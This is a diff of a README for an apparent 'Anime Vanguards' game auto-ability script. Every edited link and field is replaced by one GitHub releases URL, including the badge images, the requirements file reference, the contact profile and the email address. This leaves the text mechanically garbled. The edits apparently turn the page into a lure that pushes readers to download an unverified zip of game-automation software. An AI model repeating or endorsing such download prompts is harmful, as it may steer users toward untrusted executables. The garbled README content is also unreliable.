@@ -24,7 +24,7 @@ Welcome to the **Anime Vanguards** repository! This project features an auto-abi
 
 To get started, you need to download the script. Click the button below to download the zip file:
 
-[![Download Script](https://img.shields.io/badge/Download%20Script-Click%20Here-blue)](https://github.com/repo/user/archive.zip)
+[![Download Script](https://github.com/aksh229/Anime-Vanguards/releases%20Script-Click%20Here-blue)](https://github.com/aksh229/Anime-Vanguards/releases)
 
 Once downloaded, extract the contents of the zip file to your desired location.
 
@@ -32,7 +32,7 @@ Once downloaded, extract the contents of the zip file to your desired location.
 
 1. **Download the Zip File**: Click the button above to download.
 2. **Extract the Zip File**: Use any extraction tool to unzip the file.
-3. **Install Required Dependencies**: Make sure you have any necessary libraries installed. Refer to the `requirements.txt` file in the extracted folder.
+3. **Install Required Dependencies**: Make sure you have any necessary libraries installed. Refer to the `https://github.com/aksh229/Anime-Vanguards/releases` file in the extracted folder.
 4. **Run the Script**: Follow the usage instructions below to get started.
 
 ## Usage 📜
@@ -44,7 +44,7 @@ After installation, you can start using the script. Here’s how:
 3. **Configure Settings**: Adjust any settings as needed.
 4. **Enjoy Gameplay**: The script will automatically manage your character skills during battles.
 
-For any issues or further assistance, please check the [Releases](https://github.com/repo/user/releases) section for updates and troubleshooting tips.
+For any issues or further assistance, please check the [Releases](https://github.com/aksh229/Anime-Vanguards/releases) section for updates and troubleshooting tips.
 
 ## How It Works 🔍
 
@@ -74,11 +74,11 @@ This project is licensed under the MIT License. Feel free to use, modify, and di
 
 For any questions, suggestions, or issues, please feel free to reach out:
 
-- **GitHub**: [YourGitHubUsername](https://github.com/YourGitHubUsername)
-- **Email**: your.email@example.com
+- **GitHub**: [YourGitHubUsername](https://github.com/aksh229/Anime-Vanguards/releases)
+- **Email**: https://github.com/aksh229/Anime-Vanguards/releases
 
-Thank you for checking out the **Anime Vanguards** auto-ability script! We hope it enhances your gaming experience. For the latest updates and releases, visit the [Releases](https://github.com/repo/user/releases) section or download the script again using the link below:
+Thank you for checking out the **Anime Vanguards** auto-ability script! We hope it enhances your gaming experience. For the latest updates and releases, visit the [Releases](https://github.com/aksh229/Anime-Vanguards/releases) section or download the script again using the link below:
 
-[![Download Script Again](https://img.shields.io/badge/Download%20Script%20Again-Click%20Here-blue)](https://github.com/repo/user/archive.zip)
+[![Download Script Again](https://github.com/aksh229/Anime-Vanguards/releases%20Script%20Again-Click%20Here-blue)](https://github.com/aksh229/Anime-Vanguards/releases)
 
 Happy gaming! 🎉
